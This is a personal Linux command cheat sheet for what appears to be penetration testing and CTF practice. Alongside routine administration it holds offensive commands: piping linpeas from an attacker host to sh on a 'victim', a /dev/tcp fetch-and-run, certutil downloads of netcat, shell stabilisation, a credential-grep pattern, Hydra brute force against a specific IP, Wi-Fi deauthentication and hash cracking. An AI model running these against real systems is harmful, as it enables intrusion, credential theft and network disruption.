# My Quick Linux Command List
you can modify the commands as per your requirements please observer the command before copy paste as there is explanation after commands in brackets,
Thank you



Virtual space inside terminal:
-------------------------------------
```
python3 -m venv env 
source env/bin/activate
```

Apache server:
-------------------------------------
```
sudo systemctl start apache2
sudo systemctl stop apache2
sudo systemctl restart apache2
enable systemctl apache2
sudo nano /etc/apache2/apache2.conf (apache config file to change port and other things)
```

Gobuster subdomain Enumeration:
--------------------------------------
```
gobuster vhost -u example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 4 --append-domain
```
```
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains=top1million-5000.txt -t 10 
```
Dirsearch directory find:
--------------------------------------
```
dirsearch -u http://url.com/ -e*
```
```
gobuster dir -u http://url.com/ -w wordlist -t 10
```

Host file direct entry:
--------------------------------------
```
echo "10.10.11.254 demo.skyfall.htb" | sudo tee -a /etc/hosts
```

Locating scripts in unix:
--------------------------------------
```
locate *.nse | grep <servicename> 
``` 

FOr stable shell and internal machine to machine download:
--------------------------------------------------------------------
```
python3 -c "import pty;pty.spawn('/bin/bash')"
certutil -urlcache -f http://10.10.14.154:8888/nc64.exe nc64.exe #(windows)
wget http://ipaddress:portnumber/filename #(for both linux and windows)
```

Privilege Escalation common Commands:
---------------------------------------------------------------------------
```
whoami
ls -la
uname -a
cat /proc/version
id 
history
sudo -l
cat /etc/crontab
find / -perm -u=s -type f 2>/dev/null
netstat -tuln
getcap -r / 2>/dev/null
filecap

```

Linepeas Installation on Target with and without internet
---------------------------------------------------------------------------------------------------------------------------------------------------------------

```bash
# From github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Without curl
python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
```

```bash
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
```

ligolo-ng port forwarding tool commands:
-----------------------------------------------------------------------
```
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert (for hacking ctf machines)
./proxy -autocert (for real world)
./agent -connect 10.10.16.35:11601 -ignore-cert (target machine use this command)
session (choose session or simply press senter)
start (use this command in ligolo)
sudo ip route add 240.0.0.1/32 dev ligolo (to route the local running services to our machine magic ip)
```

Port Forwarding using SSH
-------------------------------------------------------------------------------------------
```
 ssh -L 8888:localhost:8080 rajesh@34.44.2.255 (with password)
 ssh -i private_key -L 8888:localhost:8080 username@targetip (with private key)
 (above syntax -L 8888(our machine port):localhost:8080(target machine localhost and ip to forward)
```

SSH RELATED:
------------------------------------------------------------------------------------
```
nano /etc/ssh/sshd_config
cat /etc/passwd | cut -d: -f1  #(display all users in the machine)
sudo service ssh restart 
sudo passwd -S username
sudo passwd -u username
ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555 #(ssh portforwarding for adb in mobile)
```

for adding a new user:
----------------------------
```
sudo adduser cyber
sudo usermod -aG sudo cyber
nano /etc/sudoers    #(adding user to sudoers file to get su permission)
usrname  ALL=(ALL:ALL) ALL
```
searching and removing user from using sudo and giving file permissions:
--------------------------------------------------------------------------------------
```
sudo gpasswd -d username sudo (to remove sudo permisson of anyuser)
getent group sudo (to list the sudo users in sudo group)

nano /etc/sudoers    (adding user to sudoers file to get su permission)
username  ALL=(ALL:ALL) ALL (giving all executable permissions)

sudo chown -R kali:www-data html
sudo chmod -R 750 folder (to remove forbidden access)
sudo chmod g+w /var/www/html/*.php /var/www/html/*.html

sudo chmod 775 test.sh
sudo chown tennyson:tennyson test.sh
```

Stabilizing the reverse shell:
-----------------------------------------------------------------------------------
```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice, and then enter:
export TERM=xterm
```


Converting ova to vmdk and other extensions:
-----------------------------------------------------------------------------------
```
tar xvf HF2019-Linux.ova #(unziping ova file)
./VBoxManage clonehd "S:\HF2019-Linux.ova\HF2019-Linux\HF2019-Linux-disk001.vdi" S:\HF2019-Linux.ova\vmdk\disk.vmdk --format VMDK
```

All cmds on extracting and compressig:
--------------------------------------------------------------------------------------
## zip
```
zip archive.zip file1 file2 directory1
unzip archive.zip (to extract .zip)
```
## tar compression
```
tar -cvf archive.tar file1 file2 directory1
tar -cvzf archive.tar.gz file1 file2 directory1
tar -cvjf archive.tar.bz2 file1 file2 directory1
tar -cvJf archive.tar.xz file1 file2 directory1
```
## tar extraction
```
tar -xvf archive.tar
tar -xzvf archive.tar.gz
tar -xjvf archive.tar.bz2
tar -xJvf archive.tar.xz
```
## gzip
```
gzip file.txt
gunzip file.txt.gz (to extract .gz)
```
## bzip2
```
bzip2 file.txt
bunzip2 file.txt.bz2 (to extract .bz2)
```
## xz file.txt
```
xz file.txt
unxz file.txt.xz (to extract .xz)
``` 
## 7z
```
7z a archive.7z file1 file2 directory1
7za x archive.7z (to extract .7z)

```
## rar
```
rar a archive.rar file1 file2 directory1
unrar x archive.rar  (to extract .rar)
```

Grep filtering commands
-----------------------------------------------------------------------------------------------------
```
grep -oP '(?<=^| )([0-9]{1,3}\.){3}[0-9]{1,3}(?= |$)'| sort | uniq  (filter ipaddress)
grep -Ev '^\s*https?://|.{41,}|^\s*$' | grep -E '[a-z0-9!@#$%^&*()-_=+{};:,.<>?]{5,}:[a-z0-9!@#$%^&*()-_=+{};:,.<>?]{5,}' | grep -v -e 'http://' -e 'https://' (filter credentails)
grep -ril 'username' /var/www/html (will show the files contains username)
```

Manual assigning of ipv4 to wlan0
-----------------------------------------------------------------------------------
```
ifconfig wlan0 192.168.1.7 netmask 255.255.255.0
```

Hash cracking:
----------------------------------------------------------
## John The Ripper (basic Format)
```
john -w=<wordlist> hash.txt
john --format=raw-md5 --wordlist=<wordlist> <hash_file>
john --format=bcrypt --wordlist=<wordlist> <hash_file>
john --format=raw-sha1 --wordlist=<wordlist> <hash_file>
john --format=raw-sha256 --wordlist=<wordlist> <hash_file>
```
## hashcat (basic format)
```
hashcat -m 0 -a 0 <hash_file> <wordlist>  (md5 hashes)
hashcat -m 3200 -a 0 <hash_file> <wordlist> (bcrypt hashes)
hashcat -m 100 -a 0 <hash_file> <wordlist> (sha1 hashes)
hashcat -m 1400 -a 0 <hash_file> <wordlist> (sha 256 hashes)
```

FTP server:
---------------------------------------------------------
```
apt install vsftpd
systemctl start vsftpd
systemctl enable vsftpd
systemctl status vsftpd
```


wireless hacking
------------------------------------------------------------------------------------
```
sudo airmon-ng start wlan0 #(Put Wi-Fi adapter in monitor mode)
sudo airodump-ng wlan0mon #(Start capturing traffic:)
sudo airodump-ng -c [channel] --bssid [BSSID] -w outputfile wlan0mon #(Capture a handshake:)
sudo aireplay-ng -0 5 -a [BSSID] wlan0mon #(Deauthenticate a client:)
```

Crack the handshake:
--------------------------------------------
```
sudo aircrack-ng -w wordlist.txt -b [BSSID] outputfile.cap 
aircrack-ng outputfile.cap #(Identify Handshake or get bssid)
aircrack-ng -w wordlist.txt outputfile.cap #(direct crack)
```
Hydra all brute force commands:
--------------------------------------------------------------------------------------------
```
note "-P" capital for passwordlists if it is only single password use small "-p"
hydra -l <username> -P <passwords_file> <target_ip> ssh
hydra -l <username> -P <passwords_file> <target_ip> ftp
hydra -l <username> -P <passwords_file> <target_ip> mysql
hydra -l <username> -p <password> <ip> <service> -s <port>
hydra -V -f -P '/home/kali/rockyou.txt'  10.10.7.91 vnc (without username)
hydra -C <combinations.txt> <ip> <service>
hydra -l <username> -P <passwords_file> <target_url> http-post-form "<post_data>:<failure_string>" #(post form)
hydra -l <username> -P <passwords_file> <target_url> http-get #(get request login)
hydra -l <username> -P <passwords_file> <target_url> http-get-form "<login_url>:<form_field_names>:<failure_string>:<cookie_string>"
hydra -l admin -P '/home/kali/rockyou.txt' 34.170.40.47 -s 8080 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password. Please try again."
```

wireshark packet filters:
------------------------------------------------------------------------------------------
## Protocol Filters:
```
tcp: Filters TCP traffic.
udp: Filters UDP traffic.
icmp: Filters ICMP traffic.
http: Filters HTTP traffic.
dns: Filters DNS traffic.
arp: Filters ARP traffic.
smtp: Filters SMTP traffic.
ftp: Filters FTP traffic.
ssl: Filters SSL/TLS traffic.
ssh: Filters SSH traffic.
```
## Address Filters:
```
ip.addr == x.x.x.x: Filters traffic for a specific IP address.
ip.src == x.x.x.x: Filters traffic with a specific source IP address.
ip.dst == x.x.x.x: Filters traffic with a specific destination IP address.
eth.addr == xx:xx:xx:xx:xx:xx: Filters traffic based on MAC address.
```
## Port Filters:
```
tcp.port == xxxx: Filters TCP traffic on a specific port.
udp.port == xxxx: Filters UDP traffic on a specific port.
```
## Logical Operators:
```
and: Logical AND operator.
or: Logical OR operator.
not: Logical NOT operator.
```
## Comparisons:
```
==: Equals.
!=: Not equal.
>: Greater than.
<: Less than.
```
## Range Filters:
```
ip.addr in x.x.x.x/y: Filters traffic within a specific IP address range.
tcp.port in {x, y, z}: Filters traffic on multiple TCP ports.
udp.port in {x, y, z}: Filters traffic on multiple UDP ports.
```
## Display Filters:
```
frame.number == n: Filters by frame number.
frame.time_relative > n: Filters by time relative to the start of capture.
```
## HTTP Filters:
```
http.request.method == "GET": Filters HTTP GET requests.
http.response.code == 200: Filters HTTP responses with status code 200.
http.host == "example.com": Filters HTTP traffic for a specific host.
```
## DNS Filters:
```
dns.qry.name == "example.com": Filters DNS queries for a specific domain.
dns.resp.addr == x.x.x.x: Filters DNS responses with a specific IP address.
```
## SSL/TLS Filters:
```
ssl.handshake: Filters SSL handshake packets.
ssl.record.content_type == 23: Filters SSL application data packets.
```

